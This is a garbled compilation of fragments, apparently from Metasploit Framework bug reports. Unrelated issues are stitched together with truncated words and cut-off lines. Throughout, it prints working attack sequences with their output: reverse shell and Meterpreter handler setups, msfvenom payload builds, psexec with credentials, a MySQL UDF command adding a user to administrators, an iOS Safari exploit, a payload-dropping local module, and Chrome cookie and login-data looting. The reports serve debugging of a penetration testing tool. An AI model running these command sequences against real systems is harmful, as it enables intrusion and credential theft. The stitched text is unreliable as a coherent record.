then run a reverse https payload pointed at any of your system's ip's.
on a new machine without /home/<user>/.msf4/ 2
`wget `
`sudo docker-compose run --rm --service-ports -e msf_uid=$(id -u) -e msf_gid=$(id -g) ms` rsions.
`wget `
`docker-compose run --rm --service-ports -e msf_uid=$(id -u) -e msf_gid=$(id -g) ms` i followed the *readme.md* located here :
i install the mainactivity and run the below shell command to make it persistent
#!/bin/bash
do am start --user 0 -a android.intent.action.main -n com.metasploit.stage/.mainactivity
it works fine and i was able to make connections
problem comes when i hide the app using hide_app_icon command 4
the app hides and shell script stopped working.
wondering if the location changes after hiding the app ? please help me asap rsions.
execute msfvenom -p windows/meterpreter/reverse_tcp --payload-options
firstly, i connected 'obdlink sx' and a car and then connected to metasploit hardwarebridge as following:
![180326-0005](
elm327_relay.rb -s /dev/ttyusb0
relay is up and running..
open new terminal and executed as following:
msf > use auxiliary/client/hwbridge/connect msf auxiliary(connect) > run [*] attempting to connect to 127.0.0.1...
[*] hardware bridge interface session 1 opened (127.0.0.1 -> 127.0.0.1) at 2018-xx-xx xx:xx:xx +0900
[+] hwbridge session established
[*] hw specialty: {"automotive"=>true} capabilities: {"can"=>true}
[!] notice: you are about to leave the matrix
all actions performed on this hardeware bridge
[!] could have real world consequences
use this module in a controlled testing
[!] environment and with equipment youa re authorized to perform testing on.
[*] auxiliary modlue executeion completed
msf auxiliary(connect) > sessions -i 1
[*] starting interaction with 1..
hwbridge > supported_buses
available buses can0 ![180320-0002]( hwbridge > run post/hardware/automotive/getvinfo canbus=can0 [-] post failed: nomethoderror undefined method '[]' for nil:nilclass
[-] call stack: [-] /opt/metasploit-framework/embedded/framework/lib/msf/post/hardware/automotive/uds.rb:112:in 'get_current_data_pids'
[-] /opt/metasploit-framework/embedded/framework/modules/post/hardware/automotive/getvinfo.rb:38:in `run' hwbridge > run post/hardware/automotive/getvinfo canbus=can0 [-] post failed: nomethoderror undefined method 'join' for nil:nilclass
[-] call stack: [-] /opt/metasploit-framework/embedded/framework/lib/msf/post/hardware/automotive/uds.rb:112:in 'get_current_data_pids'
[-] /opt/metasploit-framework/embedded/framework/modules/post/hardware/automotive/getvinfo.rb:38:in 'run' ![180323-0012](
use exploit/windows/smb/psexec
set payload windows/meterpreter/reverse_udp set lhost 192.168.56.9
set rhost 192.168.56.3
set smbuser administrator
set smbpass password1
exploit ```
ran post/multi/recon/local_exploit_suggester against a 64-bit machine
had a suggestion of exploit/windows/local/ms_ndproxy
tried the exploit, got told it doesn't work on 64-bit systems rsions
## expected behaviour the exploit suggester should check the architecture, see it is 64 not 32-bit and not suggest the exploit
## current behaviour a exploit that won't work is suggested
## system stuff
basic operation as per module instructions ## victim os
windows 7 x64
i updated the package for kali to the latest released version: 4.16.46
during the tests i got an error when running
msfvenom -b '\\x00\\xff'
`rake spec`
note the first bit of output: ```
deprecation warning: the factory_girl gem is deprecated
please upgrade to factory_bot
see for further instructions
(called from <top (required)> at /home/todb/git/metasploit-framework/config/application.rb:10)
/home/todb/.rvm/rubies/ruby-2.4.3/bin/ruby -i/home/todb/.rvm/gems/ruby-2.4.3@metasploit-framework/gems/rspec-core-3.7.1/lib:/home/todb/.rvm/gems/ruby-2.4.3@metasploit-framework/gems/rspec-support-3.7.1/lib /home/todb/.rvm/gems/ruby-2.4.3@metasploit-framework/gems/rspec-core-3.7.1/exe/rspec --pattern spec/\\*\\*\\{,/\\*/\\*\\*\\}/\\*_spec.rb
deprecation warning: the factory_girl gem is deprecated
please upgrade to factory_bot
see for further instructions
(called from <top (required)> at /home/todb/git/metasploit-framework/config/application.rb:10)
run options: include {:focus=>true} ```
this is on a fresh clone of metasploit-framework.
msfvenom -p windows/x64/vncinject/reverse_winhttp -f exe lhost=192.168.2.115 > /mnt/vnchttp64.exe 2
msfconsole use exploit/multi/handler
set payload windows/x64/vncinject/reverse_http
set lhost "ip of metasploit machine" 3
running the vnchttp.exe on windows 2012 machine with connectivity to the metaploit machine here are the results: msf exploit(handler) > [*] handling request from 192.168.2.114; (uuid: qwcvrevo) staging x64 payload (475136 bytes) ...
[*] handling request from 192.168.2.114; (uuid: qwcvrevo) starting local tcp relay on 127.0.0.1:5900...
[*] handling request from 192.168.2.114; (uuid: qwcvrevo) local tcp relay started.
[*] handling request from 192.168.2.114; (uuid: qwcvrevo) launched vncviewer.
[*] vnc connection closed.
/usr/bin/vncviewer: vnc server closed connection vnc session should be open
vnc session allways break cause of server error.
msf5 > version
framework: 5.0.0-dev-ee71350d5d
console : 5.0.0-dev-ee71350d5d
msf5 > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_named_pipe
payload => windows/x64/meterpreter/bind_named_pipe
msf5 exploit(windows/smb/psexec) > set smbuser vagrant
smbuser => vagrant
msf5 exploit(windows/smb/psexec) > set smbpass vagrant
smbpass => vagrant
msf5 exploit(windows/smb/psexec) > set rhost 192.168.16.102
rhost => 192.168.16.102
msf5 exploit(windows/smb/psexec) > set lport 30001
lport => 30001
i have been using "exploit/apple_ios/browser/safari_libtiff"
and payload "osx/armle/execute/reverse_tcp" i have been using my internal ip..
i tried to use ngorok external ip once, then the link was successfully opened and the session was created, but the handler could not connect , and the session was also immediately closed with an error
**this is what i have been doing** msf > use exploit/apple_ios/browser/safari_libtiff
msf exploit(safari_libtiff) > set uripath /ipwn
uripath => /ipwn
msf exploit(safari_libtiff) > set payload osx/armle/execute/reverse_tcp
payload => osx/armle/execute/reverse_tcp
msf exploit(safari_libtiff) > set lhost xxx.xxx.x.xxx
lhost => xxx.xxx.x.xxx
msf exploit(safari_libtiff) > set lport 4444
lport => 4444
msf exploit(safari_libtiff) > exploit
[*] started reverse handler
[*] using url:
[*] local ip:
[*] server started.
[*] exploit running as background job.
msf exploit(safari_libtiff) >
`mysql> create function sys_eval returns string soname 'udf.dll';`
`mysql> select sys_eval('net localgroup administrators domain\\user /add');`
`error 2013 (hy000): lost connection to mysql server during query` alternatively: 1
`mysql> create function sys_eval returns string soname 'udf.dll';`
`mysql> select sys_eval('');`
`error 2013 (hy000): lost connection to mysql server during query`
use exploit/multi/handler set your payload as windows/x64/powershell_reverse_tcp
and set all other relevant variables**
msf exploit(multi/handler) > show options module options (exploit/multi/handler): name current setting required description ---- --------------- -------- ----------- payload options (windows/x64/powershell_reverse_tcp): name current setting required description ---- --------------- -------- ----------- exitfunc process yes exit technique (accepted: '', seh, thread, process, none) lhost 192.168.1.5 yes the listen address load_modules no a list of powershell modules seperated by a comma to download over the web lport 4444 yes the listen port exploit target: id name -- ---- 0 wildcard target msf exploit(multi/handler) > run -j -z
[*] exploit running as background job 4.
[*] started reverse ssl handler on 192.168.1.5:4444
generate an executable from payload/windows/x64/powershell_reverse_tcp** ```
msf > use payload/windows/x64/powershell_reverse_tcp
msf payload(windows/x64/powershell_reverse_tcp) > show options module options (payload/windows/x64/powershell_reverse_tcp): name current setting required description ---- --------------- -------- ----------- exitfunc process yes exit technique (accepted: '', seh, thread, process, none) lhost 192.168.1.5 yes the listen address load_modules no a list of powershell modules seperated by a comma to download over the web lport 4444 yes the listen port msf payload(windows/x64/powershell_reverse_tcp) > generate -t exe -f /root/desktop/test.exe
[*] writing 8192 bytes to /root/desktop/test.exe...
``` rsions.
get a session get credentials for admin user
use credentials with run_as module with cmdout meterpreter > run post/windows/manage/run_as domain=x user=y password=z cmd=whoami cmdout=1 [*] executing createprocesswithlogonw...
[+] process started successfully, pid: 736
[-] post failed: eoferror eoferror
[-] call stack:
[-] /usr/share/metasploit-framework/lib/rex/post/meterpreter/channels/pool.rb:84:in `read'
[-] /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs/io.rb:25:in `sysread'
[-] /usr/share/metasploit-framework/lib/msf/core/post/file.rb:431:in `_read_file_meterpreter'
[-] /usr/share/metasploit-framework/lib/msf/core/post/file.rb:281:in `read_file'
[-] /usr/share/metasploit-framework/modules/post/windows/manage/run_as.rb:115:in `run'
meterpreter > sysinfo
computer : x
os : windows 10 (build 15063).
architecture : x64
system language : en_gb
domain : workgroup
logged on users : 15
meterpreter : x64/windows
1.) acquire a secondary hard drive
2.) install metasploit in a subdirectory on that drive - eg: r:\\utilities\\metasploit-framework\\
3.) wait for an update
4.) run msfupdate.bat
use exploit/windows/smb/ms17_010__eternalblue
set options for the exploit
run it this happens with other exploits too
use the cisco_benigncertain module on a compliant, non-vulnerable ike implementation, such as strongswan.
create and start x86 `reverse_tcp` listener in "persistent listeners"
connect via `tinymet` or builded via `msfvenom` stager
goto to new created session in msf pro gui and click to "command shell"
get list of process via `ps` command
migrate to `cmd.exe` or `explorer.exe`
the following local exploit module demonstrates this issue: ```ruby
# this module requires metasploit:
# current source:
## class metasploitmodule < msf::exploit::local rank = excellentranking include msf::post::file include msf::exploit::exe include msf::exploit::filedropper def initialize(info = {}) super(update_info(info, 'name' => 'test', 'description' => %q{ test }, 'license' => msf_license, 'author' => [ 'test' ], 'disclosuredate' => 'test', 'platform' => 'win', 'arch' => [ arch_x86, arch_x64 ], 'sessiontypes' => [ 'shell', 'meterpreter' ], 'targets' => [[ 'auto', {} ]], 'references' => [ [ ] ] )) end def exploit puts cmd_exec 'cmd.exe', '/c echo test' puts cmd_exec 'cmd.exe', '/c echo we made it to the end' end
``` ## example output ``` ppppp iiiiiii n n p pp i nn n identification p pp i n n n ppppp i n n n program p i n nn p iiiiiii n n strike a key when ready ..
=[ metasploit v5.0.0-dev-b247b8e ]
+ -- --=[ 1759 exploits - 996 auxiliary - 300 post ]
+ -- --=[ 509 payloads - 40 encoders - 10 nops ]
+ -- --=[ ** this is metasploit 5 development branch ** ] msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/powershell_reverse_tcp payload => windows/powershell_reverse_tcp
msf5 exploit(multi/handler) > set lhost 172.16.191.244
lhost => 172.16.191.244
smsf5 exploit(multi/handler) > set lport 1337
lport => 1337
msf5 exploit(multi/handler) > run [*] started reverse ssl handler on 172.16.191.244:1337 [*] powershell session session 1 opened (172.16.191.244:1337 -> 172.16.191.153:49200) at 2018-02-06 01:49:21 -0500 windows powershell running as user user on win-sgbsd5tqutq
copyright (c) 2015 microsoft corporation
all rights reserved
ps c:\\users\\user>whoami
win-sgbsd5tqutq\\user
ps c:\\users\\user> ^z
background session 1? [y/n] y msf5 exploit(multi/handler) > sessions active sessions
=============== id name type information connection -- ---- ---- ----------- ---------- 1 powershell /win 172.16.191.244:1337 -> 172.16.191.153:49200 (172.16.191.153) msf5 exploit(multi/handler) > sessions -u 1
[*] executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1] [!] session may not be compatible with this module.
[*] upgrading session id: 1
[*] starting exploit/multi/handler
[*] started reverse tcp handler on 172.16.191.244:4433 [*] sending stage (50248 bytes) to 172.16.191.153
[*] meterpreter session 2 opened (172.16.191.244:4433 -> 172.16.191.153:49201) at 2018-02-06 01:49:43 -0500
msf5 exploit(multi/handler) > sessions -i 2
[*] starting interaction with 2..
meterpreter > getuid
server username: win-sgbsd5tqutq\\user
meterpreter > background session 2? [y/n] ``` ```
msf5 exploit(multi/handler) > use exploit/windows/local/test msf5 exploit(windows/local/test) > set session 1
session => 1
msf5 exploit(windows/local/test) > run [!] session may not be compatible with this module.
[*] started reverse tcp handler on 172.16.191.244:4444 [*] exploit completed, but no session was created.
msf5 exploit(windows/local/test) > set session 2
session => 2
msf5 exploit(windows/local/test) > run [!] session may not be compatible with this module.
[*] started reverse tcp handler on 172.16.191.244:4444 test
we made it to the end
[*] exploit completed, but no session was created.
msf5 exploit(windows/local/test) > sessions -i 1
[*] starting interaction with 1..
windows powershell running as user user on win-sgbsd5tqutq
copyright (c) 2015 microsoft corporation
all rights reserved
ps c:\\users\\user>win-sgbsd5tqutq\\user
ps c:\\users\\user> ps c:\\users\\user> zeangvdqkcveaiy
yyocnvqpinqowxl
ps c:\\users\\user> the term 'uname' is not recognized as the name of a cmdlet, function, script fi
le, or operable program
check the spelling of the name, or if a path was inclu
ded, verify that the path is correct and try again.
at line:2 char:6
+ uname <<<< -ms + categoryinfo : objectnotfound: (uname:string) [], commandnotfou ndexception + fullyqualifiederrorid : commandnotfoundexception yantymvlhmgvupu
python.exe : python 2.7.1
at line:2 char:7
+ python <<<< -v 2>&1 + categoryinfo : notspecified: (python 2.7.1:string) [], remoteex ception + fullyqualifiederrorid : nativecommanderror jeadvcpqzigjtec
ps c:\\users\\user> python.exe : python 2.7.1
at line:2 char:7
+ python <<<< -v 2>&1 + categoryinfo : notspecified: (python 2.7.1:string) [], remoteex ception + fullyqualifiederrorid : nativecommanderror ^z
background session 1? [y/n] y
smsf5 exploit(windows/local/test) > sessions active sessions
=============== id name type information connection -- ---- ---- ----------- ---------- 1 powershell /win 172.16.191.244:1337 -> 172.16.191.153:49200 (172.16.191.153) 2 meterpreter python/windows win-sgbsd5tqutq\\user @ win-sgbsd5tqutq 172.16.191.244:4433 -> 172.16.191.153:49201 (172.16.191.153) ``` ```
msf5 exploit(windows/local/test) > sessions -k 1
[*] killing the following session(s): 1
[*] killing session 1
[*] 172.16.191.153 - powershell session session 1 closed.
msf5 exploit(windows/local/test) > use exploit/multi/handler msf5 exploit(multi/handler) > run [*] started reverse ssl handler on 172.16.191.244:1337 [*] powershell session session 3 opened (172.16.191.244:1337 -> 172.16.191.153:49203) at 2018-02-06 01:55:53 -0500 windows powershell running as user user on win-sgbsd5tqutq
copyright (c) 2015 microsoft corporation
all rights reserved
ps c:\\users\\user>^z
background session 3? [y/n] y msf5 exploit(multi/handler) > use exploit/windows/local/test msf5 exploit(windows/local/test) > set session 3
session => 3
msf5 exploit(windows/local/test) > run [!] session may not be compatible with this module.
[*] started reverse tcp handler on 172.16.191.244:4444 test we made it to the end [*] exploit completed, but no session was created.
msf5 exploit(windows/local/test) > run [!] session may not be compatible with this module.
[*] started reverse tcp handler on 172.16.191.244:4444 test we made it to the end [*] exploit completed, but no session was created.
msf5 exploit(windows/local/test) > sessions -u 3
[*] executing 'post/multi/manage/shell_to_meterpreter' on session(s): [3] [!] session may not be compatible with this module.
[*] upgrading session id: 3
[*] starting exploit/multi/handler
[*] started reverse tcp handler on 172.16.191.244:4433 [*] sending stage (50248 bytes) to 172.16.191.153
[*] meterpreter session 4 opened (172.16.191.244:4433 -> 172.16.191.153:49204) at 2018-02-06 01:57:31 -0500
msf5 exploit(windows/local/test) > run [!] session may not be compatible with this module.
[*] started reverse tcp handler on 172.16.191.244:4444 [*] exploit completed, but no session was created.
msf5 exploit(windows/local/test) > sessions -k 4
[*] killing the following session(s): 4
[*] killing session 4
[*] 172.16.191.153 - meterpreter session 4 closed.
msf5 exploit(windows/local/test) > run [!] session may not be compatible with this module.
[*] started reverse tcp handler on 172.16.191.244:4444 test we made it to the end [*] exploit completed, but no session was created.
the following local exploit module demonstrates this issue: ```ruby
# this module requires metasploit:
# current source:
## class metasploitmodule < msf::exploit::local rank = excellentranking include msf::post::file include msf::exploit::exe include msf::exploit::filedropper def initialize(info = {}) super(update_info(info, \'name\' => \'test reg_dir_for_cleanup\', \'description\' => %q{ test }, \'license\' => msf_license, \'author\' => [ \'test reg_dir_for_cleanup\' ], \'disclosuredate\' => \'test dir cleanup\', \'platform\' => [ \'linux\' ], \'arch\' => [ arch_x86 ], \'sessiontypes\' => [ \'shell\', \'meterpreter\' ], \'targets\' => [[ \'auto\', {} ]], \'references\' => [ [ ] ] )) end def exploit # create a dir d = \'/tmp/.delete.me.dir\' cmd = "mkdir -p #{d}" print_status "running command: #{cmd.inspect}" output = cmd_exec cmd output.each_line { |line| vprint_status line.chomp } register_dir_for_cleanup d # upload payload payload_file = "#{d}/.payload.file" rm_f payload_file write_file payload_file, generate_payload_exe register_file_for_cleanup payload_file cmd_exec "chmod +x #{payload_file}" # execute cmd = payload_file print_status "running command: #{cmd.inspect}" output = cmd_exec "bash -c \\"exec -a asdf #{cmd}&\\"" output.each_line { |line| vprint_status line.chomp } puts cmd_exec \'echo we made it to the end\' end
``` ## example output ```
msf5 exploit(linux/local/test_reg_dir_for_cleanup) > sessions active sessions
=============== id name type information connection -- ---- ---- ----------- ---------- 11 shell cmd/unix 172.16.191.244:1337 -> 172.16.191.137:39405 (172.16.191.137) msf5 exploit(linux/local/test_reg_dir_for_cleanup) > rexploit [*] reloading module..
[!] session may not be compatible with this module.
[*] started reverse tcp handler on 172.16.191.244:4444 [*] running command: "mkdir -p /tmp/.delete.me.dir"
[*] running command: "/tmp/.delete.me.dir/.payload.file"
[*] sending stage (857352 bytes) to 172.16.191.137
[*] meterpreter session 13 opened (172.16.191.244:4444 -> 172.16.191.137:43509) at 2018-02-05 08:26:10 -0500
we made it to the end
[+] deleted /tmp/.delete.me.dir/.payload.file
[+] deleted /tmp/.delete.me.dir
[!] this exploit may require manual cleanup of '/tmp/.delete.me.dir/.payload.file' on the target
[!] this exploit may require manual cleanup of 'false' on the target
[!] this exploit may require manual cleanup of 'false' on the target meterpreter > exit
[*] shutting down meterpreter..
[*] 172.16.191.137 - meterpreter session 13 closed
reason: user exit
msf5 exploit(linux/local/test_reg_dir_for_cleanup) > run [!] session may not be compatible with this module.
[*] started reverse tcp handler on 172.16.191.244:4444 [*] running command: "mkdir -p /tmp/.delete.me.dir"
[*] running command: "/tmp/.delete.me.dir/.payload.file"
[*] sending stage (857352 bytes) to 172.16.191.137
[*] meterpreter session 14 opened (172.16.191.244:4444 -> 172.16.191.137:43516) at 2018-02-05 08:26:21 -0500
[+] deleted /tmp/.delete.me.dir/.payload.file
[+] deleted /tmp/.delete.me.dir
we made it to the end meterpreter > exit
[*] shutting down meterpreter..
[*] 172.16.191.137 - meterpreter session 14 closed
reason: user exit
msf5 exploit(linux/local/test_reg_dir_for_cleanup) > run [!] session may not be compatible with this module.
[*] started reverse tcp handler on 172.16.191.244:4444 [*] running command: "mkdir -p /tmp/.delete.me.dir"
[*] running command: "/tmp/.delete.me.dir/.payload.file"
[*] sending stage (857352 bytes) to 172.16.191.137
[*] meterpreter session 15 opened (172.16.191.244:4444 -> 172.16.191.137:43519) at 2018-02-05 08:26:27 -0500
we made it to the end
[+] deleted /tmp/.delete.me.dir/.payload.file
[+] deleted /tmp/.delete.me.dir
[!] this exploit may require manual cleanup of '/tmp/.delete.me.dir/.payload.file' on the target
[!] this exploit may require manual cleanup of 'false' on the target
[!] this exploit may require manual cleanup of 'false' on the target meterpreter > exit
[*] shutting down meterpreter..
[*] 172.16.191.137 - meterpreter session 15 closed
reason: user exit
msf5 exploit(linux/local/test_reg_dir_for_cleanup) > run [!] session may not be compatible with this module.
[*] started reverse tcp handler on 172.16.191.244:4444 [*] running command: "mkdir -p /tmp/.delete.me.dir"
[*] running command: "/tmp/.delete.me.dir/.payload.file"
[*] sending stage (857352 bytes) to 172.16.191.137
[*] meterpreter session 16 opened (172.16.191.244:4444 -> 172.16.191.137:43525) at 2018-02-05 08:26:37 -0500
we made it to the end
[+] deleted /tmp/.delete.me.dir/.payload.file
[+] deleted /tmp/.delete.me.dir
[!] this exploit may require manual cleanup of '/tmp/.delete.me.dir/.payload.file' on the target
[!] this exploit may require manual cleanup of 'false' on the target
[!] this exploit may require manual cleanup of 'false' on the target meterpreter > exit
[*] shutting down meterpreter..
[*] 172.16.191.137 - meterpreter session 16 closed
reason: user exit
### kali linux
![msf](
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_https
msf exploit(multi/handler) > set lport 443
msf exploit(multi/handler) > set lhost 192.168.105.245
msf exploit(multi/handler) > exploit -j
``` ### windows 7
_wininet configuration_
![proxy_win7]( _connection established successfully through wininet_
![msf_win7]( **_note:_** meterpreter successfully reads the **wininet** (as we got back a meterpreter session)
### windows 10
_wininet configuration_
![proxy_win10]( through the execution of the .exe file, it sends the first stage back to the metasploit but then fails to read proper the wininet proxy as trying to connect accessing directly the metasploit's ip instead through proxy
![msf_win10](
![msf_2]( ## further checks
it has been identified that meterpreter fails also and to the following oss: - windows xp sp3
- windows 2008 r2 sp1 ## winhttp
setting both wininet and winhttp on windows 10 it works properly.
`netsh winhttp set proxy 172.0.0.1:3128` setting only winhttp seems not to work on any tested lab machine.
the following local exploit module demonstrates this issue: ```ruby
# this module requires metasploit:
# current source:
## class metasploitmodule < msf::exploit::local rank = excellentranking include msf::post::file include msf::exploit::exe include msf::exploit::filedropper def initialize(info = {}) super(update_info(info, 'name' => 'test', 'description' => %q{ test }, 'license' => msf_license, 'author' => [ 'test' ], 'disclosuredate' => 'test', 'platform' => [ 'linux', 'solaris', 'unix' ], 'arch' => [ arch_x86, arch_x64 ], 'sessiontypes' => [ 'shell', 'meterpreter' ], 'targets' => [[ 'auto', {} ]], 'references' => [ [ ] ] )) end def exploit 10.times do puts cmd_exec 'echo test' end puts cmd_exec 'echo we made it to the end' end
``` ## example output ```
msf5 exploit(linux/local/test) > sessions active sessions
=============== id name type information connection -- ---- ---- ----------- ---------- 8 shell cmd/unix 172.16.191.244:1337 -> 172.16.191.170:46089 (172.16.191.170)
msf5 exploit(linux/local/test) > set session 8
session => 8
msf5 exploit(linux/local/test) > run [!] session may not be compatible with this module.
[*] started reverse tcp handler on 172.16.191.244:4444 test
we made it to the end
[*] exploit completed, but no session was created.
msf5 exploit(linux/local/test) > sessions -u 8
[*] executing 'post/multi/manage/shell_to_meterpreter' on session(s): [8] [*] upgrading session id: 8
[*] starting exploit/multi/handler
[*] started reverse tcp handler on 172.16.191.244:4433 [*] sending stage (50248 bytes) to 172.16.191.170
[*] meterpreter session 9 opened (172.16.191.244:4433 -> 172.16.191.170:33175) at 2018-02-05 03:25:11 -0500
msf5 exploit(linux/local/test) > sessions -i 9
[*] starting interaction with 9..
meterpreter > sysinfo
computer : solaris.sealab.local
os : sunos 5.11 11.1
architecture : i86pc
system language : en_us
meterpreter : python/linux
meterpreter > background session 9? [y/n] ``` ```
msf5 exploit(linux/local/test) > set session 9
session => 9
msf5 exploit(linux/local/test) > run [!] session may not be compatible with this module.
[*] started reverse tcp handler on 172.16.191.244:4444 [-] exploit failed: rex::post::meterpreter::requesterror stdapi_sys_process_execute: operation failed: unknown error
[*] exploit completed, but no session was created.
i trying to import some netsparker (ver 4.9.5) vulns in metasploit via db_import but i getting a bunch of data messages and a uccessfully imported message at the end (see the netsparker_import.txt below)
when i type vulns at the msfconsole, there nothing but if i type hosts, i can see the systems ip address
i updated the kali box where metasploit is running this morning (apt-get update dist-upgrade) this morning and rebooted but i still have the same result
i did a scan on the netsparker test site (
the .xml report can be provided upon request if required
i know there been a bug about this in the past ( )
so maybe netsparker changed the way the .xml output is structured? ## system stuff
the following local exploit module demonstrates this issue: ```ruby
# this module requires metasploit:
# current source:
## class metasploitmodule < msf::exploit::local rank = excellentranking include msf::post::file include msf::exploit::exe include msf::exploit::filedropper def initialize(info = {}) super(update_info(info, 'name' => 'test', 'description' => %q{ test }, 'license' => msf_license, 'author' => [ 'test' ], 'disclosuredate' => 'test', 'platform' => [ 'linux' ], 'arch' => [ arch_x86, arch_x64 ], 'sessiontypes' => [ 'shell', 'meterpreter' ], 'targets' => [[ 'auto', {} ]], 'references' => [ [ ] ] )) end def exploit 10.times do puts cmd_exec 'echo test' end puts cmd_exec 'echo we made it to the end' end
run post/linux/gather/enum_configs (or anything using the fs ops) with a mettle x64 session, and get:
(2018-01-28)15:29 (s:2 j:7)msf post(linux/gather/enum_configs) > exploit [-] [2018.01.28-15:29:12] post failed: eoferror eoferror
[-] [2018.01.28-15:29:12] call stack:
[-] [2018.01.28-15:29:12] /opt/metasploit4/msf4/lib/rex/post/meterpreter/channels/pool.rb:84:in `read'
[-] [2018.01.28-15:29:12] /opt/metasploit4/msf4/lib/rex/post/meterpreter/extensions/stdapi/fs/io.rb:25:in `sysread'
[-] [2018.01.28-15:29:12] /opt/metasploit4/msf4/lib/msf/core/post/file.rb:390:in `_read_file_meterpreter'
[-] [2018.01.28-15:29:12] /opt/metasploit4/msf4/lib/msf/core/post/file.rb:261:in `read_file'
[-] [2018.01.28-15:29:12] /opt/metasploit4/msf4/lib/msf/core/post/linux/system.rb:62:in `get_sysinfo'
[-] [2018.01.28-15:29:12] /opt/metasploit4/msf4/modules/post/linux/gather/enum_configs.rb:29:in `run'
[*] post module execution completed
framework log shows this looks like our old socket friend (ping @oj @busterb):
[01/28/2018 15:28:38] [w(0)] core: monitor_rsock: the remote socket is nil, exiting loop
[01/28/2018 15:28:38] [e(0)] core: post failed: eoferror eoferror
[01/28/2018 15:28:38] [w(0)] core: monitor_rsock: the remote socket is nil, exiting loop
[01/28/2018 15:29:12] [w(0)] core: monitor_rsock: the remote socket is nil, exiting loop
[01/28/2018 15:29:12] [e(0)] core: post failed: eoferror eoferror
[01/28/2018 15:29:12] [w(0)] core: monitor_rsock: the remote socket is nil, exiting loop
can anyone on master repro this with current mettle bins? i built these two days ago.
just launching ./msfconsole from terminal
test module `modules/exploits/linux/local/test.rb` : ```ruby
# this module requires metasploit:
# current source:
## class metasploitmodule < msf::exploit::local rank = excellentranking include msf::post::file include msf::exploit::exe include msf::exploit::filedropper def initialize(info = {}) super(update_info(info, \'name\' => \'test\', \'description\' => %q{ test }, \'license\' => msf_license, \'author\' => [ \'test\' ], \'disclosuredate\' => \'test\', \'platform\' => [ \'linux\' ], \'arch\' => [ arch_x86, arch_x64 ], \'sessiontypes\' => [ \'shell\', \'meterpreter\' ], \'targets\' => [[ \'auto\', {} ]], \'references\' => [ [ ] ] )) register_options( [ optint.new(\'timeout\', [ true, \'timeout (seconds)\', \'60\' ]) ]) end def timeout datastore[\'timeout\'] end def exploit cmd = \'/bin/ls -l /etc/passwd\' args = nil print_status "running command: #{cmd.inspect}" output = cmd_exec cmd, args, timeout output.each_line { |line| vprint_status line.chomp } puts \'command completed successfully\' if output =~ /root/ puts cmd_exec \'echo we made it to the end\' end
``` ## output ```
msf exploit(linux/local/test) > sessions active sessions
=============== id name type information connection -- ---- ---- ----------- ---------- 1 shell cmd/unix 172.16.191.244:1337 -> 172.16.191.137:37369 (172.16.191.137) 6 meterpreter x86/linux uid=1000, gid=1000, euid=1000, egid=1000 @ localhost.localdomain 172.16.191.244:4433 -> 172.16.191.137:49768 (172.16.191.137)
``` ### shell session ```
set sessimsf exploit(linux/local/test) > set session 1
session => 1
msf exploit(linux/local/test) > run [!] session may not be compatible with this module.
[*] started reverse tcp handler on 172.16.191.244:4444 [*] running command: "/bin/ls -l /etc/passwd"
[*] -rw-r--r--
1 root root 2076 jan 18 02:59 /etc/passwd
command completed successfully
we made it to the end
[*] exploit completed, but no session was created.
``` ### meterpreter session ```
msf exploit(linux/local/test) > set session 6
session => 6
msf exploit(linux/local/test) > run [*] started reverse tcp handler on 172.16.191.244:4444 [*] running command: "/bin/ls -l /etc/passwd"
[*] (current) unix password: # <-- wtf
we made it to the end
[*] exploit completed, but no session was created.
use auxiliary/scanner/vnc/ard_root_pw
setg rhosts file:/root/5900.txt
set rport 5900
use auxiliary/scanner/vnc/vnc_login
setg rhosts file:/root/desktop/5900.txt
setg rport 5900
msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester msf post(multi/recon/local_exploit_suggester) > sessions active sessions
=============== id name type information connection -- ---- ---- ----------- ---------- 1 shell cmd/unix 172.16.191.244:1337 -> 172.16.191.252:51338 (172.16.191.252) msf post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf post(multi/recon/local_exploit_suggester) > run [*] 172.16.191.252 - collecting local exploits for cmd/unix...
[*] 172.16.191.252 - 7 exploit checks are being tried...
[-] 172.16.191.252 - post failed: nomethoderror undefined method `fs\' for #<session:shell 172.16.191.252:51338 (172.16.191.252) "">
[-] 172.16.191.252 - call stack:
[-] 172.16.191.252 - /pentest/exploit/metasploit-framework/modules/exploits/unix/local/setuid_nmap.rb:54:in `check'
[-] 172.16.191.252 - /pentest/exploit/metasploit-framework/modules/post/multi/recon/local_exploit_suggester.rb:136:in `block in run'
[-] 172.16.191.252 - /pentest/exploit/metasploit-framework/modules/post/multi/recon/local_exploit_suggester.rb:134:in `each'
[-] 172.16.191.252 - /pentest/exploit/metasploit-framework/modules/post/multi/recon/local_exploit_suggester.rb:134:in `run'
[*] post module execution completed
``` it's worth noting that a quick review of the `setuid nmap exploit` module shows the exploit should work with either `shell` or `meterpreter` sessions - it's only the `check` method which is problematic
as such, the module could probably be updated to use something like the following (which i stole from [here]( #l82)): ```ruby def setuid?(remote_file) cmd_exec("test -u \'#{remote_file.strip}\' && echo true").include?(\'true\') end
ran reverse_tcp exploit
connected to tcp exploit and ran webcam_stream when the meterpreter session started rsions.
``` msf post(windows/gather/enum_chrome) > run [*] impersonating token: 8788
[*] running as user 'xxxxx\\xx'...
[*] extracting data for user 'xx'...
[+] downloaded web data to '/home/ppp/.msf4/loot/20180111171900_default_127.0.0.1_chrome.raw.webd_694486.txt'
[+] downloaded cookies to '/home/ppp/.msf4/loot/20180111172024_default_127.0.0.1_chrome.raw.cooki_105879.txt'
[+] downloaded history to '/home/ppp/.msf4/loot/20180111172057_default_127.0.0.1_chrome.raw.histo_609670.txt'
[+] downloaded login data to '/home/ppp/.msf4/loot/20180111172216_default_127.0.0.1_chrome.raw.login_403636.txt'
[+] downloaded bookmarks to '/home/ppp/.msf4/loot/20180111172239_default_127.0.0.1_chrome.raw.bookm_636209.txt'
[+] downloaded preferences to '/home/ppp/.msf4/loot/20180111172258_default_127.0.0.1_chrome.raw.prefe_121840.txt'
[-] post failed: encoding::invalidbytesequenceerror "`\\xde" on utf-16le
[-] call stack:
[-] /home/elpadre/git/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/railgun/library_helper.rb:63:in `encode'
[-] /home/elpadre/git/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/railgun/library_helper.rb:63:in `uniz_to_str'
